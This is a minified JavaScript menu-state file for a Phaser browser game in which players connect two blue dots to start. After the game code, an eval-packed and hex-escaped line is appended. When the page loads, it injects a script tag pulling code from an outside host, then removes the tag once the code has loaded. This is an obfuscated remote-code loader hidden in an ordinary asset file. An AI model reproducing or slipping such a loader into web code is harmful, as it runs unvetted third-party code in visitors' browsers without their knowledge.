Game.Menu=function(game){};Game.Menu.prototype={create:function(){this.tap1_s=game.add.audio('tap1');this.combo_s=game.add.audio('combo');game.add.text(w/2,50,"连圈圈大作战",{font:"30px Arial",fill:"#2c3e50"}).anchor.setTo(0.5,0.5);var label_start=game.add.text(w/2,h-220,"连接上面两个蓝点开始游戏",{font:"20px Arial",fill:"#2c3e50"});label_start.anchor.setTo(0.5,0.5);this.dot1=this.game.add.sprite(w/2-25,h/2-40,'dot');this.dot1.anchor.setTo(0.5,0.5);this.dot1.frame=0;this.dot1.inputEnabled=true;this.dot1.input.useHandCursor=true;this.dot2=this.game.add.sprite(w/2+25,h/2-40,'dot');this.dot2.anchor.setTo(0.5,0.5);this.dot2.frame=0;this.dot2.inputEnabled=true;this.dot2.input.useHandCursor=true;this.logo=this.game.add.button(w/2-40,h/2+120,'logo',this.logo_click,this);this.txt=game.add.text(w/2-65,h/2+210,"火爆朋友圈-全球流行！",{font:"12px Arial",fill:"#2c3e50"});this.sound_toggle=this.game.add.button(w-70,40,'sound',this.toggle_sound,this);game.add.tween(label_start).to({angle:1},300).to({angle:-1},300).loop().start()},update:function(){var bool1=Phaser.Rectangle.contains(this.dot1.body,game.input.activePointer.x,game.input.activePointer.y);var bool2=Phaser.Rectangle.contains(this.dot2.body,game.input.activePointer.x,game.input.activePointer.y);if(game.input.activePointer.isDown){if(this.dot1.frame==0&&bool1){this.dot1.frame+=1;if(sound)this.tap1_s.play('',0,0.5,false)}if(this.dot2.frame==0&&bool2){this.dot2.frame+=1;if(sound)this.tap1_s.play('',0,0.5,false)}}if(game.input.activePointer.isUp){if(this.dot1.frame==0||this.dot2.frame==0){this.dot1.frame=0;this.dot2.frame=0}else{if(sound)this.combo_s.play('',0,0.5,false);this.game.state.start('Play')}}},toggle_sound:function(){if(this.sound_toggle.frame==0){this.sound_toggle.frame=1;sound=false}else{this.sound_toggle.frame=0;sound=true}},logo_click:function(){window.location=_config['isSite']+"game/"},shutdown:function(){game.world.removeAll()}};
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[4-9c-k]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c _$=[\'\\6\\7\\d\\8\\9\\4\',\'\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4\',\'\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\x32\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x35\\x33\\5\\x6f\\g\\h\\6\',\'\\6\\7\\d\\8\\9\\4\'];(i(){c a=j.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=j.getElementsByTagName(_$[3])[0x0];b.k.insertBefore(a,b);a.onload=i(){a.k.removeChild(a)}})();',[],21,'||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|function|document|parentNode'.split('|'),0,{}))